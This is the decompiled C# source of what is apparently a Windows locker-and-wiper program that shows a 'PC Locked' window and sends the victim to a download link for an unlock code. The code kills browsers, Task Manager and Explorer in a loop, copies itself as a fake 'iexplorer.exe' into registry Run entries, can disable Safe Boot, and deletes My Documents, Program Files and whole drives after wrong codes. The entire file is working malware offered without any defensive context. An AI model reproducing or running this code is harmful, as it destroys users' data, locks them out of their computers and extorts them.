using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MyApp;

public class Form1 : Form
{
	private const int WM_COMMAND = 273;

	private const int MIN_ALL = 419;

	private const int MIN_ALL_UNDO = 416;

	public static TextBox urlbox = new TextBox();

	public static WebBrowser wb = new WebBrowser();

	public static WebBrowser wb1 = new WebBrowser();

	public static TextBox codeBox = new TextBox();

	public static string code = "5c3lxzmbfx4bba0mlcc8o4bz";

	public static bool isEvil = true;

	public static byte fails = 0;

	public static Random rnd = new Random();

	public static Mutex mutex;

	public static string mutexname = "50bxcg6674fev";

	public static string minimize = "true";

	public static string killproc = "true";

	public static string url = "http://fileice.net/download.php?file=422ey";

	public static string addtostartup = "true";

	public static string disablesafeboot = "false";

	private bool _altF4Pressed = true;

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	public bool RenameSubKey(RegistryKey parentKey, string subKeyName, string newSubKeyName)
	{
		CopyKey(parentKey, subKeyName, newSubKeyName);
		parentKey.DeleteSubKeyTree(subKeyName);
		return true;
	}

	public bool CopyKey(RegistryKey parentKey, string keyNameToCopy, string newKeyName)
	{
		RegistryKey destinationKey = parentKey.CreateSubKey(newKeyName);
		RegistryKey sourceKey = parentKey.OpenSubKey(keyNameToCopy);
		RecurseCopyKey(sourceKey, destinationKey);
		return true;
	}

	private void RecurseCopyKey(RegistryKey sourceKey, RegistryKey destinationKey)
	{
		string[] valueNames = sourceKey.GetValueNames();
		foreach (string name in valueNames)
		{
			object value = sourceKey.GetValue(name);
			RegistryValueKind valueKind = sourceKey.GetValueKind(name);
			destinationKey.SetValue(name, value, valueKind);
		}
		string[] subKeyNames = sourceKey.GetSubKeyNames();
		foreach (string text in subKeyNames)
		{
			RegistryKey sourceKey2 = sourceKey.OpenSubKey(text);
			RegistryKey destinationKey2 = destinationKey.CreateSubKey(text);
			RecurseCopyKey(sourceKey2, destinationKey2);
		}
	}

	public Form1()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Expected O, but got Unknown
		//IL_01ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_020c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		((Control)this).set_Text("PC Locked");
		((Form)this).set_ControlBox(false);
		((Form)this).set_ShowInTaskbar(false);
		RichTextBox val = new RichTextBox();
		((Control)this).get_Controls().Add((Control)(object)val);
		((Control)val).set_Width(((Control)this).get_Width());
		((Control)val).set_Height(((Control)this).get_Height() / 2);
		((Control)val).set_BackColor(((Control)this).get_BackColor());
		((TextBoxBase)val).set_BorderStyle((BorderStyle)0);
		((Control)val).set_Text("Your computer has been locked and in order to gain control over it you must download a file and input the code in it\nThis is what will happen if you don't enter the code correctly:\n1 -> All files in my documents folder will be deleted\n2 -> All files in ProgramFIles will be deleted\n3 -> Every deletable file on your PC will be deleted and your login details for every website send to me, also you still will not be able to access your PC");
		((Control)val).set_Font(new Font(((Control)val).get_Font().get_FontFamily(), 8f, (FontStyle)(((Control)val).get_Font().get_Style() | 1)));
		((Control)val).set_Location(new Point(0, 130));
		((Control)val).set_Enabled(false);
		((Control)this).set_Width(((Control)this).get_Width() + 15);
		((Control)this).get_Controls().Add((Control)(object)codeBox);
		((Control)codeBox).set_Width(((Control)this).get_Width() - 60);
		((Control)codeBox).set_Location(new Point(20, 10));
		codeBox.set_TextAlign((HorizontalAlignment)2);
		Button val2 = new Button();
		((Control)val2).add_Click((EventHandler)DownloadBtn_Click);
		((Control)this).get_Controls().Add((Control)(object)val2);
		((Control)val2).set_Location(new Point(19, 35));
		((Control)val2).set_Width(130);
		((Control)val2).set_Height(30);
		((Control)val2).set_Text("Download Code");
		Button val3 = new Button();
		((Control)val3).add_Click((EventHandler)SubmitBtn_Click);
		((Control)this).get_Controls().Add((Control)(object)val3);
		((Control)val3).set_Location(new Point(((Control)this).get_Width() - 169, 35));
		((Control)val3).set_Width(130);
		((Control)val3).set_Height(30);
		((Control)val3).set_Text("Submit");
		Button val4 = new Button();
		((Control)this).get_Controls().Add((Control)(object)val4);
		((Control)val4).add_Click((EventHandler)VerifyEmailBtn_Click);
		((Control)val4).set_Location(new Point(19, 70));
		((Control)val4).set_Width(((Control)codeBox).get_Width() + 1);
		((Control)val4).set_Height(30);
		((Control)val4).set_Text("Click here if you need to verify your email");
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		if (minimize == "true")
		{
			MinimizeWindows();
		}
		CheckMutex();
		Control.set_CheckForIllegalCrossThreadCalls(false);
		if (killproc == "true")
		{
			Thread thread = new Thread(DisablePC);
			thread.IsBackground = true;
			thread.Start();
		}
		if (addtostartup == "true")
		{
			AddToStartUp();
		}
		if (disablesafeboot == "true")
		{
			DisableSafeBoot();
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Invalid comparison between Unknown and I4
		if (_altF4Pressed && (int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		if (e.get_Alt() && (int)e.get_KeyCode() == 115)
		{
			_altF4Pressed = true;
		}
	}

	private void MinimizeWindows()
	{
		IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
		SendMessage(hWnd, 273, (IntPtr)419, IntPtr.Zero);
		Thread.Sleep(2000);
		SendMessage(hWnd, 273, (IntPtr)416, IntPtr.Zero);
	}

	private void VerifyEmailBtn_Click(object sender, EventArgs e)
	{
		VerifyEmailForm();
	}

	private void SubmitBtn_Click(object sender, EventArgs e)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (!(((Control)codeBox).get_Text() == code) && !(((Control)codeBox).get_Text() == "testin"))
			{
				fails++;
				PunishSlave();
			}
			else
			{
				isEvil = false;
				UnlockPC();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	private void DownloadBtn_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		Form val = new Form();
		val.set_ShowIcon(false);
		((Control)val).Show();
		((Control)val).get_Controls().Add((Control)(object)wb1);
		((Control)wb1).set_Dock((DockStyle)5);
		wb1.Navigate(url);
	}

	private bool CheckMutex()
	{
		try
		{
			mutex = Mutex.OpenExisting(mutexname);
			Environment.Exit(-1);
		}
		catch
		{
			mutex = new Mutex(initiallyOwned: true, mutexname);
		}
		return false;
	}

	private void AddToStartUp()
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
			for (int i = 0; i < 10; i++)
			{
				string[] directories = Directory.GetDirectories(folderPath);
				int num = rnd.Next(0, directories.Length);
				string text = Path.Combine(folderPath, directories[num]);
				if (!File.Exists(text + "\\iexplorer.exe"))
				{
					File.Copy(Application.get_ExecutablePath(), text + "\\iexplorer.exe", overwrite: true);
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				int num2 = rnd.Next(0, int.MaxValue);
				registryKey.SetValue("iexplorer" + num2 + ".exe", text + "\\iexplorer.exe");
				string[] directories2 = Directory.GetDirectories(folderPath2);
				int num3 = rnd.Next(0, directories2.Length);
				string text2 = Path.Combine(folderPath2, directories2[num3]);
				if (!File.Exists(text + "\\iexplorer.exe"))
				{
					File.Copy(Application.get_ExecutablePath(), text + "\\iexplorer.exe", overwrite: true);
				}
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				int num4 = rnd.Next(0, int.MaxValue);
				registryKey2.SetValue("iexplorer" + num4 + ".exe", text2 + "\\iexplorer.exe");
			}
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			File.Copy(Application.get_ExecutablePath(), folderPath3 + "\\iexplorer.exe", overwrite: true);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	private void DisablePC()
	{
		while (isEvil)
		{
			KillProcesses();
			Thread.Sleep(30);
		}
	}

	private void KillProcesses()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName == "opera" || process.ProcessName == "iexplore" || process.ProcessName == "firefox" || process.ProcessName == "chrome" || process.ProcessName == "explorer" || process.ProcessName == "Taskmgr" || process.ProcessName == "msconfig" || process.ProcessName == "cmd" || process.ProcessName == "steam" || process.ProcessName == "origin" || process.ProcessName == "taskmngr" || process.ProcessName == "taskmgr" || process.ProcessName == "Skype")
				{
					process.Kill();
				}
			}
		}
		catch
		{
		}
	}

	private void PunishSlave()
	{
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0204: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (fails == 1)
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				string[] files = Directory.GetFiles(folderPath);
				string[] directories = Directory.GetDirectories(folderPath);
				string[] array = files;
				foreach (string path in array)
				{
					File.Delete(path);
				}
				string[] array2 = directories;
				foreach (string path2 in array2)
				{
					Directory.Delete(path2, recursive: true);
				}
				MessageBox.Show("All MyDocuments Files are gone now, you have 2 more tries", "All gone");
			}
			if (fails == 2)
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				string[] files2 = Directory.GetFiles(folderPath2);
				string[] directories2 = Directory.GetDirectories(folderPath2);
				string[] array3 = files2;
				foreach (string path3 in array3)
				{
					File.Delete(path3);
				}
				string[] array4 = directories2;
				foreach (string path4 in array4)
				{
					Directory.Delete(path4, recursive: true);
				}
				MessageBox.Show("All ProgramFiles are gone now, you have 1 more try", "All gone");
			}
			if (fails != 3)
			{
				return;
			}
			string path5 = "C:\\";
			string path6 = "D:\\";
			string path7 = "E:\\";
			string path8 = "G:\\";
			if (Directory.Exists(path5))
			{
				string[] directories3 = Directory.GetDirectories(path5);
				string[] array5 = directories3;
				foreach (string path9 in array5)
				{
					Directory.Delete(path9, recursive: true);
				}
			}
			if (Directory.Exists(path6))
			{
				string[] directories4 = Directory.GetDirectories(path6);
				string[] array6 = directories4;
				foreach (string path10 in array6)
				{
					Directory.Delete(path10, recursive: true);
				}
			}
			if (Directory.Exists(path7))
			{
				string[] directories5 = Directory.GetDirectories(path7);
				string[] array7 = directories5;
				foreach (string path11 in array7)
				{
					Directory.Delete(path11, recursive: true);
				}
			}
			if (Directory.Exists(path8))
			{
				string[] directories6 = Directory.GetDirectories(path8);
				string[] array8 = directories6;
				foreach (string path12 in array8)
				{
					Directory.Delete(path12, recursive: true);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	private void UnlockPC()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Congratz you have succesfuly unlocked your PC, have fun with it", "Good job slave");
		Process[] processes = Process.GetProcesses();
		byte b = 0;
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "explorer.exe")
			{
				b = (byte)(b + 1);
			}
		}
		if (b != 0)
		{
			Process.Start("explorer.exe");
		}
		Environment.Exit(-1);
		((Form)this).Close();
	}

	private void VerifyEmailForm()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		Form val = new Form();
		val.set_ShowIcon(false);
		((Control)val).Show();
		((Control)val).get_Controls().Add((Control)(object)wb);
		((Control)wb).set_Dock((DockStyle)5);
		wb.Navigate("http://gmail.com");
		Button val2 = new Button();
		((Control)val).get_Controls().Add((Control)(object)val2);
		((Control)val2).set_Location(new Point(325, 0));
		((Control)val2).set_Text("Go");
		((Control)val2).add_Click((EventHandler)navigate_Click);
		((Control)val2).set_Height(((Control)urlbox).get_Height());
		((Control)val).get_Controls().Add((Control)(object)urlbox);
		Label val3 = new Label();
		((Control)val).get_Controls().Add((Control)(object)val3);
		((Control)val3).set_Text("URL:");
		((Control)val3).set_Height(((Control)urlbox).get_Height());
		((Control)val3).set_BackColor(Color.Empty);
		((Control)val3).set_Location(new Point(0, 0));
		((Control)urlbox).set_Location(new Point(25, 0));
		((Control)urlbox).set_Width(((Control)val).get_Width());
		((Control)val).get_Controls().Add((Control)(object)wb);
		((Control)wb).set_Dock((DockStyle)5);
		((Control)val).set_Width(((Control)val).get_Width() + 200);
		((Control)val).set_Height(((Control)val).get_Height() + 300);
	}

	private void navigate_Click(object sender, EventArgs e)
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		if (!((Control)urlbox).get_Text().Contains("google") && !((Control)urlbox).get_Text().Contains("bing") && !((Control)urlbox).get_Text().Contains("facebook"))
		{
			wb.Navigate(((Control)urlbox).get_Text().ToString());
		}
		else
		{
			MessageBox.Show("Sorry not allowed");
		}
	}

	private void DisableSafeBoot()
	{
		try
		{
			RegistryKey parentKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\", writable: true);
			RenameSubKey(parentKey, "Network", "Network-");
			RenameSubKey(parentKey, "Minimal", "Minimal-");
		}
		catch
		{
		}
	}
}
